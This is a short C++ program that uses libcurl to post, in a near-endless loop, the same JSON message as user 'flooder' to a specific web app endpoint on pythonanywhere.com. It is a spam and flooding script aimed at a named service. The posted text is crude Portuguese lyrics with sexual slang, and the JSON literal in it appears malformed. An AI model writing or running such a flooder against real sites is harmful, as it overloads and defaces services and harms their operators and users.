#include <iostream>
#include <thread>
#include <chrono>
#include <curl/curl.h>

int main() {
    CURL *curl = curl_easy_init();
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    for (int i = 0; i < 99999999999999; i++) { // limite de segurança
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "http://linkaProject.pythonanywhere.com/new");
            curl_easy_setopt(curl, CURLOPT_POST, 1L);

            std::string json = R"({
                "username":"flooder",
                "text_post":"Meu Deus, quanta empadinha!Elas me dão tanta alegria Mas a empadinha de camarão É a rainha Desmanchando na boca Penetrando macia A empadinha de camarão Me lembra tanto uma bucetinha Quando eu penso nos teus olhos Vejo só escuridão Nada fica, tudo passa No fundo falso dessa canção Meu Deus, quanta empadinha Elas me dão tanta alegria Mas a empadinha de camarão É a rainha Desmanchando na boca Penetrando macia A empadinha de camarão Me lembra tanto uma bucetinha Quando o dia vira noite E o Sol foi pro além Quando tudo é muito pouco E o que era eu Agora é breu",
                "datetime":"11/09/2001"
        })";

            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());
            curl_easy_perform(curl);
        }

        std::cout << "request " << i << " enviada\n";

        
    }

    curl_easy_cleanup(curl);
    return 0;
}